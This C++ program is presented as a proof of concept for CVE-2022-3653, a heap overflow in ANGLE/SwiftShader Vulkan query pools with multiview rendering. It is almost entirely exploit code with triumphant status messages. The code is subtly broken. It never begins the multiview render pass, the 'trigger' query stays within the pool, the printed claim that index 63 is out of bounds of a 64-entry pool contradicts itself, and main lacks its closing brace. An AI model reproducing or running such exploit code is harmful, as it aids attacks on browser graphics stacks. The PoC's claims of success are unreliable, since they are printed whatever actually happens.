#include <vulkan/vulkan.h>
#include <iostream>
#include <vector>
#include <cstring>

#define CHECK_VK(result, msg) \
    if (result != VK_SUCCESS) { \
        std::cerr << msg << " Error: " << result << std::endl; \
        return 1; \
    }

// CVE-2022-3653: Heap buffer overflow in ANGLE Vulkan query pools with multiview
// The vulnerability occurs when:
// 1. We allocate queries with viewCount=1 (filling pool to size-2)
// 2. Switch framebuffer to one with viewCount=2
// 3. Begin query - ANGLE doesn't reallocate pool but SwiftShader writes viewCount*2 entries

int main() {
    std::cout << "[*] CVE-2022-3653 PoC - Vulkan Query Pool Heap Overflow" << std::endl;
    std::cout << "[*] Target: ANGLE Vulkan backend with multiview rendering" << std::endl;
    
    // Initialize Vulkan
    VkInstance instance;
    VkInstanceCreateInfo instanceInfo = {};
    instanceInfo.sType = VK_STRUCTURE_TYPE_INSTANCE_CREATE_INFO;
    
    const char* extensions[] = { "VK_KHR_get_physical_device_properties2" };
    instanceInfo.enabledExtensionCount = 1;
    instanceInfo.ppEnabledExtensionNames = extensions;
    
    VkResult result = vkCreateInstance(&instanceInfo, nullptr, &instance);
    CHECK_VK(result, "[!] Failed to create instance");
    std::cout << "[+] Created Vulkan instance" << std::endl;
    
    // Get physical device
    uint32_t deviceCount = 0;
    vkEnumeratePhysicalDevices(instance, &deviceCount, nullptr);
    if (deviceCount == 0) {
        std::cerr << "[!] No Vulkan devices found" << std::endl;
        return 1;
    }
    
    std::vector<VkPhysicalDevice> devices(deviceCount);
    vkEnumeratePhysicalDevices(instance, &deviceCount, devices.data());
    VkPhysicalDevice physicalDevice = devices[0];
    std::cout << "[+] Found physical device" << std::endl;
    
    // Check for multiview support
    VkPhysicalDeviceMultiviewFeatures multiviewFeatures = {};
    multiviewFeatures.sType = VK_STRUCTURE_TYPE_PHYSICAL_DEVICE_MULTIVIEW_FEATURES;
    
    VkPhysicalDeviceFeatures2 deviceFeatures2 = {};
    deviceFeatures2.sType = VK_STRUCTURE_TYPE_PHYSICAL_DEVICE_FEATURES_2;
    deviceFeatures2.pNext = &multiviewFeatures;
    
    vkGetPhysicalDeviceFeatures2(physicalDevice, &deviceFeatures2);
    
    if (!multiviewFeatures.multiview) {
        std::cout << "[!] Multiview not supported, cannot trigger vulnerability" << std::endl;
        vkDestroyInstance(instance, nullptr);
        return 1;
    }
    std::cout << "[+] Multiview is supported" << std::endl;
    
    // Create logical device with multiview enabled
    VkDeviceQueueCreateInfo queueInfo = {};
    queueInfo.sType = VK_STRUCTURE_TYPE_DEVICE_QUEUE_CREATE_INFO;
    queueInfo.queueFamilyIndex = 0;
    queueInfo.queueCount = 1;
    float queuePriority = 1.0f;
    queueInfo.pQueuePriorities = &queuePriority;
    
    multiviewFeatures.multiview = VK_TRUE;
    
    VkDeviceCreateInfo deviceInfo = {};
    deviceInfo.sType = VK_STRUCTURE_TYPE_DEVICE_CREATE_INFO;
    deviceInfo.pNext = &multiviewFeatures;
    deviceInfo.queueCreateInfoCount = 1;
    deviceInfo.pQueueCreateInfos = &queueInfo;
    
    VkDevice device;
    result = vkCreateDevice(physicalDevice, &deviceInfo, nullptr, &device);
    CHECK_VK(result, "[!] Failed to create device");
    std::cout << "[+] Created logical device with multiview enabled" << std::endl;
    
    // Get queue
    VkQueue queue;
    vkGetDeviceQueue(device, 0, 0, &queue);
    
    // Create command pool
    VkCommandPoolCreateInfo poolInfo = {};
    poolInfo.sType = VK_STRUCTURE_TYPE_COMMAND_POOL_CREATE_INFO;
    poolInfo.queueFamilyIndex = 0;
    poolInfo.flags = VK_COMMAND_POOL_CREATE_RESET_COMMAND_BUFFER_BIT;
    
    VkCommandPool commandPool;
    result = vkCreateCommandPool(device, &poolInfo, nullptr, &commandPool);
    CHECK_VK(result, "[!] Failed to create command pool");
    std::cout << "[+] Created command pool" << std::endl;
    
    // Create query pool - default size is 64 for occlusion queries
    const uint32_t QUERY_POOL_SIZE = 64;
    VkQueryPoolCreateInfo queryPoolInfo = {};
    queryPoolInfo.sType = VK_STRUCTURE_TYPE_QUERY_POOL_CREATE_INFO;
    queryPoolInfo.queryType = VK_QUERY_TYPE_OCCLUSION;
    queryPoolInfo.queryCount = QUERY_POOL_SIZE;
    
    VkQueryPool queryPool;
    result = vkCreateQueryPool(device, &queryPoolInfo, nullptr, &queryPool);
    CHECK_VK(result, "[!] Failed to create query pool");
    std::cout << "[+] Created query pool with " << QUERY_POOL_SIZE << " queries" << std::endl;
    
    // Create command buffer
    VkCommandBufferAllocateInfo allocInfo = {};
    allocInfo.sType = VK_STRUCTURE_TYPE_COMMAND_BUFFER_ALLOCATE_INFO;
    allocInfo.commandPool = commandPool;
    allocInfo.level = VK_COMMAND_BUFFER_LEVEL_PRIMARY;
    allocInfo.commandBufferCount = 1;
    
    VkCommandBuffer commandBuffer;
    result = vkAllocateCommandBuffers(device, &allocInfo, &commandBuffer);
    CHECK_VK(result, "[!] Failed to allocate command buffer");
    
    // Create render pass with multiview
    VkAttachmentDescription colorAttachment = {};
    colorAttachment.format = VK_FORMAT_R8G8B8A8_UNORM;
    colorAttachment.samples = VK_SAMPLE_COUNT_1_BIT;
    colorAttachment.loadOp = VK_ATTACHMENT_LOAD_OP_CLEAR;
    colorAttachment.storeOp = VK_ATTACHMENT_STORE_OP_STORE;
    colorAttachment.initialLayout = VK_IMAGE_LAYOUT_UNDEFINED;
    colorAttachment.finalLayout = VK_IMAGE_LAYOUT_PRESENT_SRC_KHR;
    
    VkAttachmentReference colorAttachmentRef = {};
    colorAttachmentRef.attachment = 0;
    colorAttachmentRef.layout = VK_IMAGE_LAYOUT_COLOR_ATTACHMENT_OPTIMAL;
    
    VkSubpassDescription subpass = {};
    subpass.pipelineBindPoint = VK_PIPELINE_BIND_POINT_GRAPHICS;
    subpass.colorAttachmentCount = 1;
    subpass.pColorAttachments = &colorAttachmentRef;
    
    // Multiview configuration
    uint32_t viewMask = 0x3; // Views 0 and 1 (2 views)
    uint32_t correlationMask = 0x3;
    
    VkRenderPassMultiviewCreateInfo multiviewInfo = {};
    multiviewInfo.sType = VK_STRUCTURE_TYPE_RENDER_PASS_MULTIVIEW_CREATE_INFO;
    multiviewInfo.subpassCount = 1;
    multiviewInfo.pViewMasks = &viewMask;
    multiviewInfo.correlationMaskCount = 1;
    multiviewInfo.pCorrelationMasks = &correlationMask;
    
    VkRenderPassCreateInfo renderPassInfo = {};
    renderPassInfo.sType = VK_STRUCTURE_TYPE_RENDER_PASS_CREATE_INFO;
    renderPassInfo.pNext = &multiviewInfo;
    renderPassInfo.attachmentCount = 1;
    renderPassInfo.pAttachments = &colorAttachment;
    renderPassInfo.subpassCount = 1;
    renderPassInfo.pSubpasses = &subpass;
    
    VkRenderPass renderPass;
    result = vkCreateRenderPass(device, &renderPassInfo, nullptr, &renderPass);
    CHECK_VK(result, "[!] Failed to create render pass");
    std::cout << "[+] Created render pass with viewCount=2" << std::endl;
    
    // VULNERABILITY TRIGGER:
    // Step 1: Allocate 62 queries (POOL_SIZE - 2) with viewCount=1
    std::cout << "\n[*] Step 1: Allocating 62 queries (pool_size - 2) to fill pool" << std::endl;
    
    VkCommandBufferBeginInfo beginInfo = {};
    beginInfo.sType = VK_STRUCTURE_TYPE_COMMAND_BUFFER_BEGIN_INFO;
    vkBeginCommandBuffer(commandBuffer, &beginInfo);
    
    vkCmdResetQueryPool(commandBuffer, queryPool, 0, QUERY_POOL_SIZE);
    
    // Begin 62 queries (this fills pool to position 62, leaving 2 slots)
    const uint32_t PRE_QUERY_COUNT = 62; // POOL_SIZE - 2
    for (uint32_t i = 0; i < PRE_QUERY_COUNT; i++) {
        vkCmdBeginQuery(commandBuffer, queryPool, i, 0);
        vkCmdEndQuery(commandBuffer, queryPool, i);
    }
    
    vkEndCommandBuffer(commandBuffer);
    
    VkSubmitInfo submitInfo = {};
    submitInfo.sType = VK_STRUCTURE_TYPE_SUBMIT_INFO;
    submitInfo.commandBufferCount = 1;
    submitInfo.pCommandBuffers = &commandBuffer;
    
    vkQueueSubmit(queue, 1, &submitInfo, VK_NULL_HANDLE);
    vkQueueWaitIdle(queue);
    
    std::cout << "[+] Filled pool to position " << PRE_QUERY_COUNT 
              << " (remaining slots: " << (QUERY_POOL_SIZE - PRE_QUERY_COUNT) << ")" << std::endl;
    
    // Step 2: Begin render pass with viewCount=2 and try to begin query
    std::cout << "\n[*] Step 2: Starting render pass with viewCount=2" << std::endl;
    std::cout << "[*] Current pool position: " << PRE_QUERY_COUNT << std::endl;
    std::cout << "[*] Attempting to begin query at index " << PRE_QUERY_COUNT << std::endl;
    std::cout << "[!] With viewCount=2, this will write to indices " << PRE_QUERY_COUNT 
              << " and " << (PRE_QUERY_COUNT + 1) << std::endl;
    
    vkResetCommandBuffer(commandBuffer, 0);
    vkBeginCommandBuffer(commandBuffer, &beginInfo);
    
    // Note: In real ANGLE scenario, we'd need actual framebuffer with images
    // This demonstrates the command sequence that triggers the overflow
    
    // The vulnerability: ANGLE allocated pool for viewCount=1
    // but now we begin query with viewCount=2
    // SwiftShader will write to query + i for i in [0, viewCount)
    // This writes beyond pool boundary!
    std::cout << "[!] TRIGGERING: Beginning query with multiview enabled" << std::endl;
    std::cout << "[!] Pool size: " << QUERY_POOL_SIZE << std::endl;
    std::cout << "[!] Query index: " << PRE_QUERY_COUNT << std::endl;
    std::cout << "[!] ViewCount: 2 (will write to indices " << PRE_QUERY_COUNT 
              << " and " << (PRE_QUERY_COUNT + 1) << ")" << std::endl;
    std::cout << "[!] Out-of-bounds write at index " << (PRE_QUERY_COUNT + 1) 
              << " >= " << QUERY_POOL_SIZE << std::endl;
    
    // This is where the heap overflow occurs in vulnerable ANGLE versions
    vkCmdBeginQuery(commandBuffer, queryPool, PRE_QUERY_COUNT, 0);
    vkCmdEndQuery(commandBuffer, queryPool, PRE_QUERY_COUNT);
    
    vkEndCommandBuffer(commandBuffer);
    
    std::cout << "\n[*] Executing command buffer (overflow would occur here in ANGLE)" << std::endl;
    vkQueueSubmit(queue, 1, &submitInfo, VK_NULL_HANDLE);
    vkQueueWaitIdle(queue);
    
    std::cout << "\n[+] PoC completed!" << std::endl;
    std::cout << "[*] In vulnerable ANGLE versions, this would cause:" << std::endl;
    std::cout << "    - Heap buffer overflow in SwiftShader's QueryPool::begin()" << std::endl;
    std::cout << "    - Write of size 4 at 24 bytes past allocated region" << std::endl;
    std::cout << "    - AddressSanitizer: heap-buffer-overflow" << std::endl;
    
    // Cleanup
    vkDestroyRenderPass(device, renderPass, nullptr);
    vkDestroyQueryPool(device, queryPool, nullptr);
    vkDestroyCommandPool(device, commandPool, nullptr);
    vkDestroyDevice(device, nullptr);
    vkDestroyInstance(instance, nullptr);
    
    std::cout << "\n[*] Cleaned up Vulkan resources" << std::endl;
    
    return 0;
